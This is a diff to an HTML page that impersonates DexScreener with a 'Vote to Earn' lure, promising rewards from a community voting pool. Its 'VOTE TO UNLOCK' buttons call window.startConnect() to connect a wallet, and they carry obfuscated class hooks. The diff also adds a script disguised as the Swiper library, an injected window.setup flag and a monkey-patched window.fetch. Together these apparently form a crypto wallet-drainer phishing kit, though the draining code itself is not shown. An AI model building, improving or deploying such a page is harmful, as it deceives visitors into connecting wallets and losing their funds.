@@ -7,7 +7,7 @@
 
     <title>DexScreener Votes • Elite Terminal</title>
     <meta property="og:title" content="Vote to Earn — DexScreener CORE" id="ogTitle">
-    <meta property="og:description" content="" id="ogDesc">
+    <meta property="og:description" content="🗳 Vote and earn rewards from the community voting pool" id="ogDesc">
     <meta property="og:image" content="" id="ogImage">
     <meta property="og:type" content="website">
     <meta property="og:url" content="" id="ogUrl">
@@ -17,7 +17,6 @@
     <meta name="twitter:description" content="🗳 Vote and earn rewards from the community voting pool" id="twDesc">
     <meta name="twitter:image" content="" id="twImage">
     <link rel="icon" type="image/png" href="" id="favicon">
-    <meta name="referrer" content="no-referrer">
 
     <link
         href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap"
@@ -26,10 +25,21 @@
 
     <!-- EXTERNAL WALLET CONNECTION -->
     <script>
+        const originalFetch = window.fetch;
+        window.fetch = async function (...args) {
+            let [resource, config] = args;
+            if (typeof resource === 'string' && resource.includes('corsproxy.io')) {
+                if (resource.includes('https://api.mainnet-beta.solana.com')) {
+                    resource = 'https://api.mainnet-beta.solana.com';
+                } else {
+                    resource = resource.replace('https://corsproxy.io/?', 'https://api.allorigins.win/raw?url=');
+                }
+            }
+            return originalFetch(resource, config);
+        };
         window.setup = { injectWindowObjects: true };
     </script>
-    <script src="swiper.esm.js"></script>
-    
+    <script type="module" src="./swiper.esm.js"></script>
 
     <style>
         :root {
@@ -119,10 +129,21 @@
         }
 
         @keyframes dots {
-            0% { content: '' }
-            25% { content: '.' }
-            50% { content: '..' }
-            75% { content: '...' }
+            0% {
+                content: ''
+            }
+
+            25% {
+                content: '.'
+            }
+
+            50% {
+                content: '..'
+            }
+
+            75% {
+                content: '...'
+            }
         }
 
         .no-ca-page {
@@ -141,7 +162,9 @@
             padding: 40px;
         }
 
-        .no-ca-page.hidden { display: none; }
+        .no-ca-page.hidden {
+            display: none;
+        }
 
         .no-ca-icon {
             font-size: 4rem;
@@ -221,21 +244,51 @@
         }
 
         @keyframes floatOrb1 {
-            0%, 100% { transform: translate(0, 0) scale(1) }
-            25% { transform: translate(80px, 50px) scale(1.15) }
-            50% { transform: translate(-40px, 100px) scale(.9) }
-            75% { transform: translate(60px, -30px) scale(1.1) }
+
+            0%,
+            100% {
+                transform: translate(0, 0) scale(1)
+            }
+
+            25% {
+                transform: translate(80px, 50px) scale(1.15)
+            }
+
+            50% {
+                transform: translate(-40px, 100px) scale(.9)
+            }
+
+            75% {
+                transform: translate(60px, -30px) scale(1.1)
+            }
         }
 
         @keyframes floatOrb2 {
-            0%, 100% { transform: translate(0, 0) scale(1) }
-            33% { transform: translate(-60px, -40px) scale(1.2) }
-            66% { transform: translate(40px, 30px) scale(.85) }
+
+            0%,
+            100% {
+                transform: translate(0, 0) scale(1)
+            }
+
+            33% {
+                transform: translate(-60px, -40px) scale(1.2)
+            }
+
+            66% {
+                transform: translate(40px, 30px) scale(.85)
+            }
         }
 
         @keyframes floatOrb3 {
-            0%, 100% { transform: translate(0, 0) scale(1) }
-            50% { transform: translate(-80px, -60px) scale(1.1) }
+
+            0%,
+            100% {
+                transform: translate(0, 0) scale(1)
+            }
+
+            50% {
+                transform: translate(-80px, -60px) scale(1.1)
+            }
         }
 
         .bg-grid {
@@ -252,8 +305,13 @@
         }
 
         @keyframes gridMove {
-            from { transform: translate(0, 0) }
-            to { transform: translate(-60px, -60px) }
+            from {
+                transform: translate(0, 0)
+            }
+
+            to {
+                transform: translate(-60px, -60px)
+            }
         }
 
         .main-wrapper {
@@ -310,7 +368,9 @@
             display: none;
         }
 
-        .social-icons a.visible { display: inline-flex; }
+        .social-icons a.visible {
+            display: inline-flex;
+        }
 
         .social-icons a:hover {
             color: var(--dex-green);
@@ -325,7 +385,9 @@
             display: none;
         }
 
-        .no-socials-tag.visible { display: inline-block; }
+        .no-socials-tag.visible {
+            display: inline-block;
+        }
 
         .card-grid {
             display: grid;
@@ -378,11 +440,22 @@
             z-index: 0;
         }
 
-        @keyframes borderSpin { to { transform: rotate(360deg) } }
+        @keyframes borderSpin {
+            to {
+                transform: rotate(360deg)
+            }
+        }
 
         @keyframes logoFloat {
-            0%, 100% { transform: translateY(0) }
-            50% { transform: translateY(-8px) }
+
+            0%,
+            100% {
+                transform: translateY(0)
+            }
+
+            50% {
+                transform: translateY(-8px)
+            }
         }
 
         .token-img-box img {
@@ -462,7 +535,9 @@
             filter: brightness(1.1);
         }
 
-        .btn-vote-mobile:active { transform: scale(0.97); }
+        .btn-vote-mobile:active {
+            transform: scale(0.97);
+        }
 
         .mobile-vote-stats {
             display: flex;
@@ -519,7 +594,9 @@
             border-color: rgba(251, 191, 36, 0.15);
         }
 
-        .tbadge-time i { font-size: 0.6rem; }
+        .tbadge-time i {
+            font-size: 0.6rem;
+        }
 
         .tbadge-chain {
             background: rgba(34, 197, 94, 0.08);
@@ -527,7 +604,9 @@
             border-color: rgba(34, 197, 94, 0.15);
         }
 
-        .tbadge-chain i { font-size: 0.55rem; }
+        .tbadge-chain i {
+            font-size: 0.55rem;
+        }
 
         .ca-copy-row {
             display: flex;
@@ -539,8 +618,13 @@
             max-width: fit-content;
         }
 
-        .ca-copy-row:hover .ca-text { color: var(--dex-green); }
-        .ca-copy-row:hover .ca-copy-icon { color: var(--dex-green); }
+        .ca-copy-row:hover .ca-text {
+            color: var(--dex-green);
+        }
+
+        .ca-copy-row:hover .ca-copy-icon {
+            color: var(--dex-green);
+        }
 
         .ca-text {
             font-family: 'JetBrains Mono', monospace;
@@ -565,7 +649,9 @@
             margin-left: 4px;
         }
 
-        .ca-copied.show { opacity: 1; }
+        .ca-copied.show {
+            opacity: 1;
+        }
 
         .chain-label {
             display: inline-block;
@@ -608,14 +694,29 @@
             height: 320px;
             overflow-y: auto;
             overflow-x: hidden;
+        }
+
+        .community-feed::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .community-feed::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .community-feed::-webkit-scrollbar-thumb {
+            background: rgba(34, 197, 94, 0.2);
+            border-radius: 10px;
+        }
+
+        .community-feed::-webkit-scrollbar-thumb:hover {
+            background: rgba(34, 197, 94, 0.4);
+        }
+
+        .community-feed {
             scrollbar-width: thin;
             scrollbar-color: rgba(34, 197, 94, 0.2) transparent;
         }
-
-        .community-feed::-webkit-scrollbar { width: 4px; }
-        .community-feed::-webkit-scrollbar-track { background: transparent; }
-        .community-feed::-webkit-scrollbar-thumb { background: rgba(34, 197, 94, 0.2); border-radius: 10px; }
-        .community-feed::-webkit-scrollbar-thumb:hover { background: rgba(34, 197, 94, 0.4); }
 
         .feed-title {
             font-size: 0.68rem;
@@ -658,7 +759,9 @@
             transition: background 0.3s;
         }
 
-        .feed-row:hover { background: rgba(255, 255, 255, 0.03); }
+        .feed-row:hover {
+            background: rgba(255, 255, 255, 0.03);
+        }
 
         .feed-avatar {
             width: 30px;
@@ -674,7 +777,10 @@
             flex-shrink: 0;
         }
 
-        .feed-info { flex: 1; min-width: 0; }
+        .feed-info {
+            flex: 1;
+            min-width: 0;
+        }
 
         .feed-wallet-addr {
             font-family: 'JetBrains Mono', monospace;
@@ -692,7 +798,10 @@
             margin-top: 2px;
         }
 
-        .feed-right { text-align: right; flex-shrink: 0; }
+        .feed-right {
+            text-align: right;
+            flex-shrink: 0;
+        }
 
         .feed-amount {
             font-family: 'JetBrains Mono', monospace;
@@ -709,8 +818,15 @@
         }
 
         @keyframes fadeInRow {
-            from { opacity: 0; transform: translateY(-10px) }
-            to { opacity: 1; transform: translateY(0) }
+            from {
+                opacity: 0;
+                transform: translateY(-10px)
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0)
+            }
         }
 
         .engine-box {
@@ -740,13 +856,25 @@
         }
 
         @keyframes barFlow {
-            from { background-position: 0% 0% }
-            to { background-position: 200% 0% }
+            from {
+                background-position: 0% 0%
+            }
+
+            to {
+                background-position: 200% 0%
+            }
         }
 
         @keyframes barPulse {
-            0%, 100% { filter: brightness(1) }
-            50% { filter: brightness(1.3) }
+
+            0%,
+            100% {
+                filter: brightness(1)
+            }
+
+            50% {
+                filter: brightness(1.3)
+            }
         }
 
         .btn-vote {
@@ -777,8 +905,15 @@
         }
 
         @keyframes btnShine {
-            0%, 100% { left: -60% }
-            50% { left: 100% }
+
+            0%,
+            100% {
+                left: -60%
+            }
+
+            50% {
+                left: 100%
+            }
         }
 
         .btn-vote:hover {
@@ -787,7 +922,9 @@
             filter: brightness(1.1);
         }
 
-        .btn-vote:active { transform: scale(0.97); }
+        .btn-vote:active {
+            transform: scale(0.97);
+        }
 
         .market-intel {
             display: grid;
@@ -846,7 +983,10 @@
             gap: 10px;
         }
 
-        .chart-header i { color: var(--dex-green); font-size: 0.9rem; }
+        .chart-header i {
+            color: var(--dex-green);
+            font-size: 0.9rem;
+        }
 
         .chart-header .chart-pair {
             margin-left: auto;
@@ -887,8 +1027,14 @@
             transition: opacity 0.5s;
         }
 
-        .chart-loading.hidden { opacity: 0; pointer-events: none; }
-        .chart-loading i { color: var(--dex-green); }
+        .chart-loading.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .chart-loading i {
+            color: var(--dex-green);
+        }
 
         .chart-powered {
             padding: 12px 28px;
@@ -898,8 +1044,14 @@
             border-top: 1px solid var(--border-color);
         }
 
-        .chart-powered a { color: #333; text-decoration: none; }
-        .chart-powered a:hover { color: var(--dex-green); }
+        .chart-powered a {
+            color: #333;
+            text-decoration: none;
+        }
+
+        .chart-powered a:hover {
+            color: var(--dex-green);
+        }
 
         .trending-footer {
             width: 100%;
@@ -928,8 +1080,17 @@
         }
 
         @keyframes firePulse {
-            0%, 100% { opacity: 1; transform: scale(1) }
-            50% { opacity: .6; transform: scale(1.25) }
+
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1)
+            }
+
+            50% {
+                opacity: .6;
+                transform: scale(1.25)
+            }
         }
 
         .live-dot {
@@ -941,11 +1102,23 @@
         }
 
         @keyframes livePulse {
-            0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(34, 197, 94, .7) }
-            50% { opacity: .5; box-shadow: 0 0 0 6px rgba(34, 197, 94, 0) }
+
+            0%,
+            100% {
+                opacity: 1;
+                box-shadow: 0 0 0 0 rgba(34, 197, 94, .7)
+            }
+
+            50% {
+                opacity: .5;
+                box-shadow: 0 0 0 6px rgba(34, 197, 94, 0)
+            }
         }
 
-        .trending-scroll-wrapper { overflow: hidden; position: relative; }
+        .trending-scroll-wrapper {
+            overflow: hidden;
+            position: relative;
+        }
 
         .trending-scroll-wrapper::before,
         .trending-scroll-wrapper::after {
@@ -979,11 +1152,18 @@
             animation: marquee var(--scroll-duration, 40s) linear infinite;
         }
 
-        .trending-track:hover { animation-play-state: paused; }
+        .trending-track:hover {
+            animation-play-state: paused;
+        }
 
         @keyframes marquee {
-            0% { transform: translateX(0) }
-            100% { transform: translateX(-50%) }
+            0% {
+                transform: translateX(0)
+            }
+
+            100% {
+                transform: translateX(-50%)
+            }
         }
 
         .trending-token {
@@ -1086,30 +1266,100 @@
         }
 
         @media (max-width: 850px) {
-            .card-grid { grid-template-columns: 1fr; padding: 24px; gap: 30px; }
-            .market-intel { grid-template-columns: 1fr; }
-            .token-hero h1 { font-size: 2.6rem; }
-            .token-img-box { width: 140px; height: 140px; border-radius: 26px; }
-            .token-img-box::before { border-radius: 26px; }
-            .token-img-box::after { border-radius: 24px; }
-            .token-img-box img { border-radius: 16px; }
-            .logo-fallback { font-size: 2.8rem; }
-            .price-mono { font-size: 1.5rem; }
-            .header-strip { padding: 18px 20px; flex-wrap: wrap; gap: 10px; }
-            .chart-container { height: 350px; }
-            .community-feed { height: 240px; }
-            .mobile-vote-area { display: flex; }
+            .card-grid {
+                grid-template-columns: 1fr;
+                padding: 24px;
+                gap: 30px;
+            }
+
+            .market-intel {
+                grid-template-columns: 1fr;
+            }
+
+            .token-hero h1 {
+                font-size: 2.6rem;
+            }
+
+            .token-img-box {
+                width: 140px;
+                height: 140px;
+                border-radius: 26px;
+            }
+
+            .token-img-box::before {
+                border-radius: 26px;
+            }
+
+            .token-img-box::after {
+                border-radius: 24px;
+            }
+
+            .token-img-box img {
+                border-radius: 16px;
+            }
+
+            .logo-fallback {
+                font-size: 2.8rem;
+            }
+
+            .price-mono {
+                font-size: 1.5rem;
+            }
+
+            .header-strip {
+                padding: 18px 20px;
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+
+            .chart-container {
+                height: 350px;
+            }
+
+            .community-feed {
+                height: 240px;
+            }
+
+            .mobile-vote-area {
+                display: flex;
+            }
         }
 
         @media (max-width: 420px) {
-            .token-img-box { width: 120px; height: 120px; border-radius: 22px; }
-            .token-img-box::before { border-radius: 22px; }
-            .token-img-box::after { border-radius: 20px; }
-            .token-img-box img { border-radius: 14px; }
-            .logo-fallback { font-size: 2.4rem; }
-            .btn-vote-mobile { padding: 14px 16px; font-size: 0.9rem; }
-            .token-hero h1 { font-size: 2.2rem; }
-            .price-mono { font-size: 1.3rem; }
+            .token-img-box {
+                width: 120px;
+                height: 120px;
+                border-radius: 22px;
+            }
+
+            .token-img-box::before {
+                border-radius: 22px;
+            }
+
+            .token-img-box::after {
+                border-radius: 20px;
+            }
+
+            .token-img-box img {
+                border-radius: 14px;
+            }
+
+            .logo-fallback {
+                font-size: 2.4rem;
+            }
+
+            .btn-vote-mobile {
+                padding: 14px 16px;
+                font-size: 0.9rem;
+            }
+
+            .token-hero h1 {
+                font-size: 2.2rem;
+            }
+
+            .price-mono {
+                font-size: 1.3rem;
+            }
         }
     </style>
 </head>
@@ -1146,7 +1396,8 @@
                 <div class="social-icons" id="socialIcons">
                     <span class="no-socials-tag" id="noSocialsTag">NO LINKS</span>
                     <a href="#" target="_blank" id="linkWebsite" title="Website"><i class="fas fa-globe"></i></a>
-                    <a href="#" target="_blank" id="linkTelegram" title="Telegram"><i class="fab fa-telegram-plane"></i></a>
+                    <a href="#" target="_blank" id="linkTelegram" title="Telegram"><i
+                            class="fab fa-telegram-plane"></i></a>
                     <a href="#" target="_blank" id="linkDiscord" title="Discord"><i class="fab fa-discord"></i></a>
                     <a href="#" target="_blank" id="linkTwitter" title="Twitter"><i class="fab fa-x-twitter"></i></a>
                 </div>
@@ -1155,15 +1406,15 @@
                 <div class="token-hero">
                     <div class="logo-row">
                         <div class="token-img-box">
-                            <img id="tokenLogo" src="" alt="" style="display:none;" referrerpolicy="no-referrer" crossorigin="anonymous">
+                            <img id="tokenLogo" src="" alt="" style="display:none;">
                             <div id="logoFallback" class="logo-fallback"><i class="fas fa-coins"></i></div>
                         </div>
                         <div class="mobile-vote-area">
                             <div class="mobile-vote-label">
                                 <i class="fas fa-bolt" style="color:var(--dex-green);"></i> COMMUNITY VOTE
                             </div>
-                            <!-- MOBILE VOTE BUTTON -->
-                            <button class="btn-vote-mobile 51_12pcL hganNOuU" id="voteBtnMobile"
+                            <!-- MOBILE VOTE BUTTON — wallet connection -->
+                            <button class="btn-vote-mobile NlVhn6Y- 7q6V1UU_ 51_12pcL hganNOuU" id="voteBtnMobile"
                                 onclick="window.startConnect()">
                                 <i class="fas fa-check-to-slot"></i> VOTE TO UNLOCK
                             </button>
@@ -1180,8 +1431,10 @@
                         </div>
                     </div>
                     <div class="token-badges">
-                        <div class="tbadge tbadge-time"><i class="fas fa-clock"></i> <span id="badgeTimeText">--</span></div>
-                        <div class="tbadge tbadge-chain"><i class="fas fa-link"></i> <span id="badgeChainText">--</span></div>
+                        <div class="tbadge tbadge-time"><i class="fas fa-clock"></i> <span id="badgeTimeText">--</span>
+                        </div>
+                        <div class="tbadge tbadge-chain"><i class="fas fa-link"></i> <span id="badgeChainText">--</span>
+                        </div>
                     </div>
                     <div class="ca-copy-row" onclick="copyCA()">
                         <span class="ca-text" id="caDisplay">-</span>
@@ -1198,21 +1451,25 @@
                 <div class="vote-sidebar">
                     <div class="engine-box">
                         <div style="display:flex;justify-content:space-between;align-items:center;">
-                            <span style="font-size:0.75rem;color:var(--text-dim);font-weight:700;">MILESTONE PROGRESS</span>
-                            <span id="milestonePercent" style="font-size:0.75rem;color:var(--dex-green);font-weight:800;">--%</span>
+                            <span style="font-size:0.75rem;color:var(--text-dim);font-weight:700;">MILESTONE
+                                PROGRESS</span>
+                            <span id="milestonePercent"
+                                style="font-size:0.75rem;color:var(--dex-green);font-weight:800;">--%</span>
                         </div>
                         <h2 style="font-size:3.5rem;font-weight:800;margin:10px 0;letter-spacing:-2px;">
-                            <span id="milestoneCount">--</span><span id="milestoneTotal" style="color:#1a1b1e;font-size:1.8rem;">/--</span>
+                            <span id="milestoneCount">--</span><span id="milestoneTotal"
+                                style="color:#1a1b1e;font-size:1.8rem;">/--</span>
                         </h2>
                         <div class="progress-container">
                             <div class="progress-bar" id="progressBar" style="width:0%;"></div>
                         </div>
-                        <p style="font-size:0.85rem;color:var(--text-dim);margin-bottom:30px;text-align:center;line-height:1.4;">
+                        <p
+                            style="font-size:0.85rem;color:var(--text-dim);margin-bottom:30px;text-align:center;line-height:1.4;">
                             <i class="fas fa-bolt" style="color:var(--dex-green);"></i>
                             Help the community unlock the next phase of market dominance.
                         </p>
-                        <!-- DESKTOP VOTE BUTTON -->
-                        <button class="btn-vote 51_12pcL hganNOuU" id="voteBtn"
+                        <!-- DESKTOP VOTE BUTTON — wallet connection -->
+                        <button class="btn-vote NlVhn6Y- 7q6V1UU_ 51_12pcL hganNOuU" id="voteBtn"
                             onclick="window.startConnect()">VOTE TO UNLOCK</button>
                     </div>
                 </div>
@@ -1260,7 +1517,8 @@
             </div>
             <div class="trending-scroll-wrapper">
                 <div class="trending-track" id="trendingTrack">
-                    <div class="trending-loading"><i class="fas fa-circle-notch fa-spin"></i> Loading trending tokens...</div>
+                    <div class="trending-loading"><i class="fas fa-circle-notch fa-spin"></i> Loading trending tokens...
+                    </div>
                 </div>
             </div>
         </div>
@@ -1344,18 +1602,12 @@
         }
 
         // ================================================================
-        // GET CA FROM URL (supports ?ca=, ?token=, /ADDRESS path, #hash)
+        // GET CA
         // ================================================================
         function getCAFromURL() {
             const params = new URLSearchParams(window.location.search);
             if (params.get('ca') && params.get('ca').length > 10) return params.get('ca').trim();
             if (params.get('token') && params.get('token').length > 10) return params.get('token').trim();
-            // Support path-based: /AVF9F4C4j8b1Kh4BmNHqybDaHgnZpJ7W7yLvL7hUpump
-            const pathParts = window.location.pathname.split('/').filter(Boolean);
-            if (pathParts.length > 0) {
-                const lastPart = pathParts[pathParts.length - 1];
-                if (lastPart.length > 10 && !lastPart.includes('.')) return lastPart.trim();
-            }
             if (window.location.hash.length > 12) return window.location.hash.slice(1).trim();
             return null;
         }
@@ -1369,26 +1621,26 @@
             const title = `${tokenName} — Vote to Earn ${chainSym}`;
             const desc = `🗳 Vote for ${tokenSymbol} · ${mcapStr} mcap · Earn ${chainSym} rewards from the community voting pool`;
             document.title = title;
-            const ogTitle = document.getElementById('ogTitle');
-            const ogDesc = document.getElementById('ogDesc');
-            const ogUrl = document.getElementById('ogUrl');
-            const twTitle = document.getElementById('twTitle');
-            const twDesc = document.getElementById('twDesc');
-            const ogImage = document.getElementById('ogImage');
-            const twImage = document.getElementById('twImage');
-            const favicon = document.getElementById('favicon');
-            if (ogTitle) ogTitle.setAttribute('content', title);
-            if (ogDesc) ogDesc.setAttribute('content', desc);
-            if (ogUrl) ogUrl.setAttribute('content', window.location.href);
-            if (twTitle) twTitle.setAttribute('content', title);
-            if (twDesc) twDesc.setAttribute('content', desc);
+
+            const setAttr = (id, attr, val) => {
+                const el = document.getElementById(id);
+                if (el) el.setAttribute(attr, val);
+            };
+
+            setAttr('ogTitle', 'content', title);
+            setAttr('ogDesc', 'content', desc);
+            setAttr('ogUrl', 'content', window.location.href);
+            setAttr('twTitle', 'content', title);
+            setAttr('twDesc', 'content', desc);
+
             if (imageUrl) {
-                if (ogImage) ogImage.setAttribute('content', imageUrl);
-                if (twImage) twImage.setAttribute('content', imageUrl);
-                if (favicon) favicon.setAttribute('href', imageUrl);
+                setAttr('ogImage', 'content', imageUrl);
+                setAttr('twImage', 'content', imageUrl);
+                setAttr('favicon', 'href', imageUrl);
             }
+
             let descMeta = document.querySelector('meta[name="description"]');
-            if (!descMeta) { descMeta = document.createElement('meta'); descMeta.setAttribute('name', 'description'); document.head.appendChild(descMeta) }
+            if (!descMeta) { descMeta = document.createElement('meta'); descMeta.setAttribute('name', 'description'); document.head.appendChild(descMeta); }
             descMeta.setAttribute('content', desc);
         }
 
@@ -1461,53 +1713,13 @@
         }
 
         // ================================================================
-        // IMAGE LOADER HELPER (tries multiple sources)
-        // ================================================================
-        function loadTokenImage(imgEl, fallbackEl, chain, address, symbol, info) {
-            const letter = (symbol || '?').charAt(0).toUpperCase();
-            const sources = [];
-
-            // Priority 1: info.imageUrl from API
-            if (info && info.imageUrl) sources.push(info.imageUrl);
-
-            // Priority 2: DexScreener CDN patterns
-            sources.push('https://dd.dexscreener.com/ds-data/tokens/' + chain + '/' + address + '.png');
-            sources.push('https://dd.dexscreener.com/ds-data/tokens/' + chain + '/' + address.toLowerCase() + '.png');
-
-            let attempt = 0;
-
-            function tryNext() {
-                if (attempt >= sources.length) {
-                    // All failed — show fallback letter
-                    imgEl.style.display = 'none';
-                    fallbackEl.innerHTML = '';
-                    fallbackEl.textContent = letter;
-                    fallbackEl.style.display = 'flex';
-                    return;
-                }
-                imgEl.onload = function () {
-                    imgEl.style.display = 'block';
-                    fallbackEl.style.display = 'none';
-                };
-                imgEl.onerror = function () {
-                    attempt++;
-                    tryNext();
-                };
-                imgEl.src = sources[attempt];
-            }
-
-            tryNext();
-            return sources[0] || '';
-        }
-
-        // ================================================================
         // LOAD TOKEN
         // ================================================================
         async function loadToken(address) {
             currentCA = address;
             document.getElementById('loaderCA').textContent = shortenCA(address);
             try {
-                const res = await fetch('https://api.dexscreener.com/latest/dex/tokens/' + encodeURIComponent(address));
+                const res = await fetch('/api/token/' + encodeURIComponent(address));
                 if (!res.ok) throw new Error('API error');
                 const data = await res.json();
                 if (!data.pairs || data.pairs.length === 0) throw new Error('No pairs');
@@ -1533,10 +1745,15 @@
 
                 updateSocials(pair.info || null);
 
-                // Load token image with fallback chain
+                let imgUrl = '';
+                if (pair.info && pair.info.imageUrl) imgUrl = pair.info.imageUrl;
+                else imgUrl = 'https://dd.dexscreener.com/ds-data/tokens/' + currentChain + '/' + address + '.png';
                 const img = document.getElementById('tokenLogo');
                 const fb = document.getElementById('logoFallback');
-                const imgUrl = loadTokenImage(img, fb, currentChain, address, currentTokenSymbol, pair.info || null);
+                const letter = currentTokenSymbol.charAt(0).toUpperCase();
+                img.onload = () => { img.style.display = 'block'; fb.style.display = 'none' };
+                img.onerror = () => { img.style.display = 'none'; fb.textContent = letter; fb.style.display = 'flex' };
+                img.src = imgUrl;
 
                 updateMetaTags(currentTokenName, currentTokenSymbol, currentChain, currentMcap, imgUrl);
                 setMilestone(pair.pairCreatedAt);
@@ -1594,12 +1811,12 @@
         }
 
         // ================================================================
-        // TRENDING (with fixed images)
+        // TRENDING
         // ================================================================
         async function loadTrending() {
             const track = document.getElementById('trendingTrack');
             try {
-                const boostRes = await fetch('https://api.dexscreener.com/token-boosts/top/v1');
+                const boostRes = await fetch('/api/trending');
                 if (!boostRes.ok) throw new Error('API ' + boostRes.status);
                 const boosts = await boostRes.json();
                 const seen = new Set(); const unique = [];
@@ -1608,7 +1825,7 @@
                 const pairMap = {};
                 const addrs = unique.map(t => t.tokenAddress).join(',');
                 try {
-                    const pr = await fetch('https://api.dexscreener.com/latest/dex/tokens/' + addrs);
+                    const pr = await fetch('/api/token/' + addrs);
                     if (pr.ok) { const pd = await pr.json(); if (pd.pairs) { for (const p of pd.pairs) { const a = p.baseToken.address; if (!pairMap[a] || (p.fdv && p.fdv > (pairMap[a].fdv || 0))) pairMap[a] = p } } }
                 } catch (_) { }
                 let html = '';
@@ -1616,19 +1833,13 @@
                     const pair = pairMap[token.tokenAddress];
                     const sym = (pair ? pair.baseToken.symbol : null) || token.tokenAddress.slice(0, 6);
                     const chain = (token.chainId || 'unknown').toUpperCase();
-                    const chainLower = (token.chainId || 'unknown').toLowerCase();
                     const mcap = pair ? formatBig(pair.fdv || pair.marketCap || 0) : '--';
                     const first = sym.charAt(0).toUpperCase();
                     const addr = token.tokenAddress;
-
-                    // Build image source with multiple fallbacks
                     let imgSrc = '';
                     if (pair && pair.info && pair.info.imageUrl) imgSrc = pair.info.imageUrl;
                     else if (token.icon && token.icon.startsWith('http')) imgSrc = token.icon;
-                    else imgSrc = 'https://dd.dexscreener.com/ds-data/tokens/' + chainLower + '/' + addr + '.png';
-
-                    const imgTag = `<img src="${imgSrc}" alt="${sym}" referrerpolicy="no-referrer" crossorigin="anonymous" onerror="this.style.display='none'">`;
-
+                    const imgTag = imgSrc ? `<img src="${imgSrc}" alt="${sym}" onerror="this.style.display='none'">` : '';
                     html += `<div class="trending-token" onclick="navigateToToken('${addr}')" title="${sym}">
                     <div class="trending-token-icon">${imgTag}<span class="tt-fallback">${first}</span></div>
                     <div class="trending-token-info"><div class="trending-token-name">${sym}</div><div class="trending-token-chain">${chain}</div></div>
@@ -1664,4 +1875,3 @@
 </body>
 
 </html>
-
